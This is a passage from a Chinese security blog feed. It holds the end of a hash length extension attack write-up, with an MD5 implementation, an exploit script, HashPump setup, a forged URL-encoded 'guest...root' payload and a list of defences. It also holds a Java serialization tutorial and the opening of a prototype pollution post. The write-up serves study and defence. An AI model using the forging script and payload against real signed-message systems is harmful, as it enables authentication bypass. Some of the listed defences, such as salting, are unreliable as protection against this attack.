<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_md5.py：</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author：DshtAnger</span><br><span class="line"># theory reference:</span><br><span class="line">#   blog：</span><br><span class="line">#       http://blog.csdn.net/adidala/article/details/28677393</span><br><span class="line">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span><br><span class="line">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span><br><span class="line">#   RFC1321：</span><br><span class="line">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span><br><span class="line">##############################################################################</span><br><span class="line">import sys</span><br><span class="line">def genMsgLengthDescriptor(msg_bitsLenth):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    ---args:</span><br><span class="line">            msg_bitsLenth : the bits length of raw message</span><br><span class="line">    --return:</span><br><span class="line">            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    return __import__(&quot;struct&quot;).pack(&quot;&gt;Q&quot;,msg_bitsLenth).encode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">def reverse_hex_8bytes(hex_str):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    --args:</span><br><span class="line">            hex_str: a hex-encoded string with length 16 , i.e.8bytes</span><br><span class="line">    --return:</span><br><span class="line">            transform raw message descriptor to little-endian </span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    hex_str = &quot;%016x&quot;%int(hex_str,16)</span><br><span class="line">    assert len(hex_str)==16    </span><br><span class="line">    return __import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,int(hex_str,16)).encode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">def reverse_hex_4bytes(hex_str):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    --args:</span><br><span class="line">            hex_str: a hex-encoded string with length 8 , i.e.4bytes</span><br><span class="line">    --return:</span><br><span class="line">            transform 4 bytes message block to little-endian</span><br><span class="line">    &#x27;&#x27;&#x27;    </span><br><span class="line">    hex_str = &quot;%08x&quot;%int(hex_str,16)</span><br><span class="line">    assert len(hex_str)==8    </span><br><span class="line">    return __import__(&quot;struct&quot;).pack(&quot;&lt;L&quot;,int(hex_str,16)).encode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">def deal_rawInputMsg(input_msg):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    --args:</span><br><span class="line">            input_msg : inputed a ascii-encoded string</span><br><span class="line">    --return:</span><br><span class="line">            a hex-encoded string which can be inputed to mathematical transformation function.</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    ascii_list = [x.encode(&quot;hex&quot;) for x in input_msg]</span><br><span class="line">    length_msg_bytes = len(ascii_list)</span><br><span class="line">    length_msg_bits = len(ascii_list)*8</span><br><span class="line">    #padding</span><br><span class="line">    ascii_list.append(&#x27;80&#x27;)  </span><br><span class="line">    while (len(ascii_list)*8+64)%512 != 0:  </span><br><span class="line">        ascii_list.append(&#x27;00&#x27;)</span><br><span class="line">    #add Descriptor</span><br><span class="line">    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))</span><br><span class="line">    return &quot;&quot;.join(ascii_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getM16(hex_str,operatingBlockNum):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    --args:</span><br><span class="line">            hex_str : a hex-encoded string with length in integral multiple of 512bits</span><br><span class="line">            operatingBlockNum : message block number which is being operated , greater than 1</span><br><span class="line">    --return:</span><br><span class="line">            M : result of splited 64bytes into 4*16 message blocks with little-endian</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128*(operatingBlockNum-1),128*operatingBlockNum,8)]</span><br><span class="line">    return M</span><br><span class="line"></span><br><span class="line">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span><br><span class="line">def T(i):</span><br><span class="line">    result = (int(4294967296*abs(__import__(&quot;math&quot;).sin(i))))&amp;0xffffffff</span><br><span class="line">    return result   </span><br><span class="line"></span><br><span class="line">#定义每轮中用到的函数</span><br><span class="line">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span><br><span class="line">F = lambda x,y,z:((x&amp;y)|((~x)&amp;z))</span><br><span class="line">G = lambda x,y,z:((x&amp;z)|(y&amp;(~z)))</span><br><span class="line">H = lambda x,y,z:(x^y^z)</span><br><span class="line">I = lambda x,y,z:(y^(x|(~z)))</span><br><span class="line">RL = L = lambda x,n:(((x&lt;&lt;n)|(x&gt;&gt;(32-n)))&amp;(0xffffffff))</span><br><span class="line"></span><br><span class="line">def FF(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a  </span><br><span class="line">def GG(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a  </span><br><span class="line">def HH(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a  </span><br><span class="line">def II(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a      </span><br><span class="line"></span><br><span class="line">def show_md5(A,B,C,D):</span><br><span class="line">    return &quot;&quot;.join( [  &quot;&quot;.join(__import__(&quot;re&quot;).findall(r&quot;..&quot;,&quot;%08x&quot;%i)[::-1]) for i in (A,B,C,D)  ]  )</span><br><span class="line"></span><br><span class="line">def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=&quot;&quot;):</span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line">    b = B</span><br><span class="line">    c = C</span><br><span class="line">    d = D</span><br><span class="line"></span><br><span class="line">    for i in xrange(0,len(readyMsg)/128):</span><br><span class="line">        M = getM16(readyMsg,i+1)</span><br><span class="line">        for i in xrange(16):</span><br><span class="line">            exec &quot;M&quot;+str(i)+&quot;=M[&quot;+str(i)+&quot;]&quot;</span><br><span class="line">        #First round</span><br><span class="line">        a=FF(a,b,c,d,M0,7,0xd76aa478L)</span><br><span class="line">        d=FF(d,a,b,c,M1,12,0xe8c7b756L)</span><br><span class="line">        c=FF(c,d,a,b,M2,17,0x242070dbL)</span><br><span class="line">        b=FF(b,c,d,a,M3,22,0xc1bdceeeL)</span><br><span class="line">        a=FF(a,b,c,d,M4,7,0xf57c0fafL)</span><br><span class="line">        d=FF(d,a,b,c,M5,12,0x4787c62aL)</span><br><span class="line">        c=FF(c,d,a,b,M6,17,0xa8304613L)</span><br><span class="line">        b=FF(b,c,d,a,M7,22,0xfd469501L)</span><br><span class="line">        a=FF(a,b,c,d,M8,7,0x698098d8L)</span><br><span class="line">        d=FF(d,a,b,c,M9,12,0x8b44f7afL)</span><br><span class="line">        c=FF(c,d,a,b,M10,17,0xffff5bb1L)</span><br><span class="line">        b=FF(b,c,d,a,M11,22,0x895cd7beL)</span><br><span class="line">        a=FF(a,b,c,d,M12,7,0x6b901122L)</span><br><span class="line">        d=FF(d,a,b,c,M13,12,0xfd987193L)</span><br><span class="line">        c=FF(c,d,a,b,M14,17,0xa679438eL)</span><br><span class="line">        b=FF(b,c,d,a,M15,22,0x49b40821L)</span><br><span class="line">        #Second round</span><br><span class="line">        a=GG(a,b,c,d,M1,5,0xf61e2562L)</span><br><span class="line">        d=GG(d,a,b,c,M6,9,0xc040b340L)</span><br><span class="line">        c=GG(c,d,a,b,M11,14,0x265e5a51L)</span><br><span class="line">        b=GG(b,c,d,a,M0,20,0xe9b6c7aaL)</span><br><span class="line">        a=GG(a,b,c,d,M5,5,0xd62f105dL)</span><br><span class="line">        d=GG(d,a,b,c,M10,9,0x02441453L)</span><br><span class="line">        c=GG(c,d,a,b,M15,14,0xd8a1e681L)</span><br><span class="line">        b=GG(b,c,d,a,M4,20,0xe7d3fbc8L)</span><br><span class="line">        a=GG(a,b,c,d,M9,5,0x21e1cde6L)</span><br><span class="line">        d=GG(d,a,b,c,M14,9,0xc33707d6L)</span><br><span class="line">        c=GG(c,d,a,b,M3,14,0xf4d50d87L)</span><br><span class="line">        b=GG(b,c,d,a,M8,20,0x455a14edL)</span><br><span class="line">        a=GG(a,b,c,d,M13,5,0xa9e3e905L)</span><br><span class="line">        d=GG(d,a,b,c,M2,9,0xfcefa3f8L)</span><br><span class="line">        c=GG(c,d,a,b,M7,14,0x676f02d9L)</span><br><span class="line">        b=GG(b,c,d,a,M12,20,0x8d2a4c8aL)</span><br><span class="line">        #Third round</span><br><span class="line">        a=HH(a,b,c,d,M5,4,0xfffa3942L)</span><br><span class="line">        d=HH(d,a,b,c,M8,11,0x8771f681L)</span><br><span class="line">        c=HH(c,d,a,b,M11,16,0x6d9d6122L)</span><br><span class="line">        b=HH(b,c,d,a,M14,23,0xfde5380c)</span><br><span class="line">        a=HH(a,b,c,d,M1,4,0xa4beea44L)</span><br><span class="line">        d=HH(d,a,b,c,M4,11,0x4bdecfa9L)</span><br><span class="line">        c=HH(c,d,a,b,M7,16,0xf6bb4b60L)</span><br><span class="line">        b=HH(b,c,d,a,M10,23,0xbebfbc70L)</span><br><span class="line">        a=HH(a,b,c,d,M13,4,0x289b7ec6L)</span><br><span class="line">        d=HH(d,a,b,c,M0,11,0xeaa127faL)</span><br><span class="line">        c=HH(c,d,a,b,M3,16,0xd4ef3085L)</span><br><span class="line">        b=HH(b,c,d,a,M6,23,0x04881d05L)</span><br><span class="line">        a=HH(a,b,c,d,M9,4,0xd9d4d039L)</span><br><span class="line">        d=HH(d,a,b,c,M12,11,0xe6db99e5L)</span><br><span class="line">        c=HH(c,d,a,b,M15,16,0x1fa27cf8L)</span><br><span class="line">        b=HH(b,c,d,a,M2,23,0xc4ac5665L)</span><br><span class="line">        #Fourth round</span><br><span class="line">        a=II(a,b,c,d,M0,6,0xf4292244L)</span><br><span class="line">        d=II(d,a,b,c,M7,10,0x432aff97L)</span><br><span class="line">        c=II(c,d,a,b,M14,15,0xab9423a7L)</span><br><span class="line">        b=II(b,c,d,a,M5,21,0xfc93a039L)</span><br><span class="line">        a=II(a,b,c,d,M12,6,0x655b59c3L)</span><br><span class="line">        d=II(d,a,b,c,M3,10,0x8f0ccc92L)</span><br><span class="line">        c=II(c,d,a,b,M10,15,0xffeff47dL)</span><br><span class="line">        b=II(b,c,d,a,M1,21,0x85845dd1L)</span><br><span class="line">        a=II(a,b,c,d,M8,6,0x6fa87e4fL)</span><br><span class="line">        d=II(d,a,b,c,M15,10,0xfe2ce6e0L)</span><br><span class="line">        c=II(c,d,a,b,M6,15,0xa3014314L)</span><br><span class="line">        b=II(b,c,d,a,M13,21,0x4e0811a1L)</span><br><span class="line">        a=II(a,b,c,d,M4,6,0xf7537e82L)</span><br><span class="line">        d=II(d,a,b,c,M11,10,0xbd3af235L)</span><br><span class="line">        c=II(c,d,a,b,M2,15,0x2ad7d2bbL)</span><br><span class="line">        b=II(b,c,d,a,M9,21,0xeb86d391L)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        A += a</span><br><span class="line">        B += b</span><br><span class="line">        C += c</span><br><span class="line">        D += d</span><br><span class="line"></span><br><span class="line">        A = A&amp;0xffffffff</span><br><span class="line">        B = B&amp;0xffffffff</span><br><span class="line">        C = C&amp;0xffffffff</span><br><span class="line">        D = D&amp;0xffffffff</span><br><span class="line"></span><br><span class="line">        a = A</span><br><span class="line">        b = B</span><br><span class="line">        c = C</span><br><span class="line">        d = D</span><br><span class="line"></span><br><span class="line">    return show_md5(a,b,c,d)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp.py</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import my_md5</span><br><span class="line">samplehash=&quot;382441859bb6709d0d9fa11ef3c255b9&quot;</span><br><span class="line">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><span class="line">s1=0x85412438</span><br><span class="line">s2=0x9d70b69b</span><br><span class="line">s3=0x1ea19f0d</span><br><span class="line">s4=0xb955c2f3</span><br><span class="line">#exp</span><br><span class="line">secret = &quot;A&quot;*13</span><br><span class="line">secret_admin = secret + &#x27;guest&#123;padding&#125;&#x27;</span><br><span class="line">padding = &#x27;\x80&#123;zero&#125;\xc8\x00\x00\x00\x00\x00\x00\x00&#x27;.format(zero=&quot;\x00&quot;*(64-15-10-1-8))</span><br><span class="line">secret_admin = secret_admin.format(padding=padding) + &#x27;root&#x27;</span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:] #我们需要截断的地方，也是我们需要控制的地方</span><br><span class="line">print &quot;getmein:&quot;+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure></div>

<p>这里使用脚本没有计算出来，可能是自己哪里的配置有错误，但是脚本不知道怎么改，就只能使用其他师傅写好的工具去运算。</p>
<p>流程图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230227225406773-1972064902.png"
                      alt="image-20230227225406242"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230227225415944-1485959466.png"
                      alt="image-20230227225415932"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230227225430591-1723384646.png"
                      alt="image-20230227225430350"
                ></p>
<h2 id="四、hashpump工具的安装与使用"><a href="#四、hashpump工具的安装与使用" class="headerlink" title="四、hashpump工具的安装与使用"></a>四、hashpump工具的安装与使用</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>

<p>使用方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230226001051474-1347763831.png"
                      alt="image-20230226001051157"
                ></p>
<p>那么我们回到题目进行验证：</p>
<p>进行url编码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00root</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230226001236185-100270824.png"
                      alt="image-20230226001235963"
                ></p>
<p>可以看到以及攻击成功了。</p>
<h2 id="五、防御方法"><a href="#五、防御方法" class="headerlink" title="五、防御方法"></a>五、防御方法</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">以下是一些防御哈希长度拓展攻击的方法：</span><br><span class="line"></span><br><span class="line">    1、使用加盐（Salting）技术</span><br><span class="line"></span><br><span class="line">加盐技术是将一个随机字符串添加到原始数据之后，再进行哈希计算。由于加盐字符串是随机的，攻击者无法通过已知的哈希值推算出加盐字符串的内容，从而无法利用哈希长度拓展攻击。加盐技术是防御哈希长度拓展攻击的常见方法。</span><br><span class="line"></span><br><span class="line">    2、使用不可逆加密算法</span><br><span class="line"></span><br><span class="line">不可逆加密算法将原始数据转换为不可逆的密文，防止攻击者通过逆向计算推算出原始数据。相比哈希算法，不可逆加密算法的计算复杂度更高，从而更加安全。</span><br><span class="line"></span><br><span class="line">    3、使用HMAC技术</span><br><span class="line"></span><br><span class="line">HMAC是一种基于哈希算法的消息认证码技术，它将密钥与消息进行混合计算，生成一个认证码，以此保证消息的完整性和真实性。HMAC技术可以在保证消息认证的同时，防止哈希长度拓展攻击。</span><br><span class="line"></span><br><span class="line">    4、使用较长的哈希值</span><br><span class="line"></span><br><span class="line">较长的哈希值可以增加哈希长度拓展攻击的难度，因为攻击者需要计算更多的哈希值才能找到一个合法的哈希值。SHA-512和SHA-3等哈希算法提供了较长的哈希值选项。</span><br><span class="line"></span><br><span class="line">    5、使用加密哈希算法</span><br><span class="line"></span><br><span class="line">加密哈希算法是一种特殊的哈希算法，它在计算哈希值的同时，还将密钥混合到哈希值中，从而保证了哈希值的安全性和不可逆性。常见的加密哈希算法包括HMAC-SHA256和bcrypt等。</span><br></pre></td></tr></table></figure></div>

]]></content>
      <tags>
        <tag>hash运算</tag>
      </tags>
  </entry>
  <entry>
    <title>Java序列化与反序列化</title>
    <url>/2023/04/21/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="JAVA-序列化和反序列化"><a href="#JAVA-序列化和反序列化" class="headerlink" title="JAVA 序列化和反序列化"></a>JAVA 序列化和反序列化</h2><h3 id="一、序列化与反序列化的简单概述"><a href="#一、序列化与反序列化的简单概述" class="headerlink" title="一、序列化与反序列化的简单概述"></a>一、序列化与反序列化的简单概述</h3><pre><code>  在前面我们学习了php和python的序列化和反序列化，那么在java中序列化同样是将java对象转换为字节序列的过程，那么同样反序列化就是将字节序列重新恢复为对象的过程。
</code></pre>
<p>​	那么为什么要进行序列化与反序列化呢？</p>
<p>​    从两个方面来说：</p>
<p>​    1、从创建的对象存在周期来看：通常java中被创建的对象的声明周期不会比JVM虚拟机的存在周期更长，JVM虚拟机运行结束后，他创建的对象也就消失了，那么如果我们想要在JVM虚拟机运行结束后调用之前存在的对象,那么我们就可以通过序列化机制将之前创建的对象储存起到磁盘中，这样我们不仅可以调用之前创建的对象，也能让对象在另一个JVM中运行(这个核心类似于我们前面学习的RMI机制)。</p>
<p>​    2、从数据的传输来看：当两个进行进行远程通信时，相互传递图片，文字等数据时是以二进制序列进行传输的，那么两个java进程之间的对象进行传输时要如何传输呢？是通过序列化转换为字节序列在网络上面进行传输的，在通过反序列化进行java对象的恢复。</p>
<h3 id="二、序列化实现"><a href="#二、序列化实现" class="headerlink" title="二、序列化实现"></a>二、序列化实现</h3><p>​	在上面我们说对象会通过序列化转换为字节序列从而在网络上面传输，那么在学习JAVA序列化之前我们先了解一下JAVA的输入输出流，也就是 JAVA IO。</p>
<pre><code> java的IO流分为了文件IO流（FileInput/OutputStream）和对象IO流（ObjectInput/OutputStream) ,那么可以看出无论是文件io还是对象io都存在输入输出流。
</code></pre>
<p>​	接下来我们分析一下流的传输过程：</p>
<p>​     无论是输出流还是输出流，流的两端都是文件和运行的java程序，所以我们如果想要在他们之间实现传输，就要通过搭建一个通道实现流的传输。</p>
<p>这里以输出流简单分析一下。</p>
<p>  我们对一个文件进行写入的操作，那么实质上是将在java程序中将流输出到指定文件中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;filename&quot;));</span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure></div>

<p>简单分析一下：</p>
<p><code>ObjectOutputStream</code> 是 Java 中的一个类，它提供了将 Java 对象写入 <code>OutputStream</code> 的功能。它用于序列化 Java 对象，即将它们转换为可以在网络上发送或存储在文件中的字节流。</p>
<p><code>FileOutputStream</code> 是 Java 中的一个类，它提供了将字节写入文件的功能。它用于将字节写入文件，可以用于创建、打开和写入文件。</p>
<p>所以通过这两个java类最终实现了对象到流到文件的转换。</p>
<p>下面开始正式分析序列化：</p>
<p>首先我们要了解只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列，不是的话则会抛出异常。</p>
<p><code>Serializable</code> 接口是 Java 中的一个接口，它没有任何方法，只是用来标记一个类可以被序列化。如果一个类实现了 <code>Serializable</code> 接口，就意味着该类的对象可以被序列化为一个字节序列，以便在网络上发送或存储在文件中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Serializable &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>下面我们通过代码来分析一下序列化的过程：</p>
<p>首先定义Animal类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Animal &#123;</span><br><span class="line">    private String color;</span><br><span class="line"> </span><br><span class="line">    public Animal() &#123;//没有无参构造将会报错</span><br><span class="line">        System.out.println(&quot;调用 Animal 无参构造&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public Animal(String color) &#123;</span><br><span class="line">        this.color = color;</span><br><span class="line"> </span><br><span class="line">            System.out.println(&quot;调用 Animal 有 color 参数的构造&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Animal&#123;&quot; +</span><br><span class="line">                &quot;color=&#x27;&quot; + color + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>BlackCat 是 Animal 的子类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BlackCat extends Animal implements Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 1L;</span><br><span class="line">    private String name;</span><br><span class="line"> </span><br><span class="line">    public BlackCat() &#123;</span><br><span class="line">        super();</span><br><span class="line">        System.out.println(&quot;调用黑猫的无参构造&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public BlackCat(String color, String name) &#123;</span><br><span class="line">        super(color);</span><br><span class="line">        this.name = name;</span><br><span class="line">        System.out.println(&quot;调用黑猫有 color 参数的构造&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;BlackCat&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +super.toString() +&#x27;\&#x27;&#x27; +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SuperMain &#123;</span><br><span class="line">    private static final String FILE_PATH = &quot;./super.bin&quot;;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        serializeAnimal();</span><br><span class="line">        deserializeAnimal();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private static void serializeAnimal() throws Exception &#123;</span><br><span class="line">        BlackCat black = new BlackCat(&quot;black&quot;, &quot;我是黑猫&quot;);</span><br><span class="line">        System.out.println(&quot;序列化前：&quot;+black.toString());</span><br><span class="line">        System.out.println(&quot;=================开始序列化================&quot;);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(FILE_PATH));</span><br><span class="line">        oos.writeObject(black);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private static void deserializeAnimal() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;=================开始反序列化================&quot;);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FILE_PATH));</span><br><span class="line">        BlackCat black = (BlackCat) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(black);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>哪我们来分析一下测试类：</p>
<p>首先我们来分析一下实现序列化的方法：</p>
<p>首先创建一个BlackCat的实例化对象，</p>
<p>然后我们主要分析下面一段代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(FILE_PATH));</span><br><span class="line">       oos.writeObject(black);</span><br><span class="line">       oos.flush();</span><br><span class="line">       oos.close();</span><br></pre></td></tr></table></figure></div>

<p>上面我们了解了ObjectOutputStream和FileOutputStream方法。</p>
<p>所以这段代码最终实现了对象转化为字节流，然后字节流写入到指定文件中</p>
<p><code>flush()</code> 是 Java 中的一个方法，用于刷新输出流并强制将所有缓冲的输出字节写入底层流中。它可以用于确保所有数据都已经写入输出流中，而不需要关闭流。</p>
<p><code>writeObject()</code> 是 <code>ObjectOutputStream</code> 类中的一个方法，用于将一个对象写入输出流中进行序列化。它可以将一个实现了 <code>Serializable</code> 接口的对象转换成一个字节序列，并将其写入输出流中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(FILE_PATH));</span><br></pre></td></tr></table></figure></div>

<p>就已经实现了序列化为什么还要是用writeObject()方法和close()方法:</p>
<p>在Java中，ObjectOutputStream和FileOutputStream类是用于序列化对象和写入文件的类。它们确实会对对象进行序列化操作并将其写入文件中。但是，即使已经将对象序列化并写入文件中，仍然需要使用writeObject()和flush()方法来确保数据已经完全写入文件中。</p>
<p>writeObject()方法将对象写入缓冲区，而不是直接写入文件。flush()方法则强制将缓冲区中的所有数据写入文件。如果不使用flush()方法，数据可能会留存在缓冲区中，并且可能不会被写入文件中。因此，如果希望确保数据已经完全写入文件中，需要在使用ObjectOutputStream和FileOutputStream类时调用writeObject()和flush()方法。</p>
<p>总之，ObjectOutputStream和FileOutputStream类确实执行序列化和写入文件的操作，但是为了确保数据已经完全写入文件中，你需要调用writeObject()和flush()方法。</p>
<p>然后下面我们来分析一下反序列化的实现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FILE_PATH));</span><br><span class="line">        BlackCat black = (BlackCat) ois.readObject();</span><br><span class="line">        ois.close();</span><br></pre></td></tr></table></figure></div>

<p><code>readObject()</code> 是 <code>ObjectInputStream</code> 类中的一个方法，用于从输入流中读取一个对象进行反序列化。它可以将一个字节序列转换成一个对象，并返回该对象。</p>
<p>这段代码使用 <code>FileInputStream</code> 从指定的文件路径 <code>FILE_PATH</code> 中创建一个输入流，然后将该输入流作为参数传递给 <code>ObjectInputStream</code> 的构造函数，创建一个 <code>ObjectInputStream</code> 对象 <code>ois</code>。这个 <code>ObjectInputStream</code> 对象可以用于读取从该文件中写入的序列化对象。</p>
]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript原型链污染</title>
    <url>/2023/07/10/%E4%BB%8EJavascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%931/</url>
    <content><![CDATA[<h3 id="一、javascript原型链污染"><a href="#一、javascript原型链污染" class="headerlink" title="一、javascript原型链污染"></a>一、javascript原型链污染</h3><h4 id="1、proto-和-prototype"><a href="#1、proto-和-prototype" class="headerlink" title="1、proto 和 prototype"></a>1、<strong>proto</strong> 和 prototype</h4><p>关于proto和prototype是javascript中两个重要的属性，我们要想要搞明白javascript的原型链污染，首先要明白proto和prototype。</p>
<p>这里粘一张图，帮助大家更好理解：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701211126945.png"
                      alt="image-20230701211126945"
                ></p>
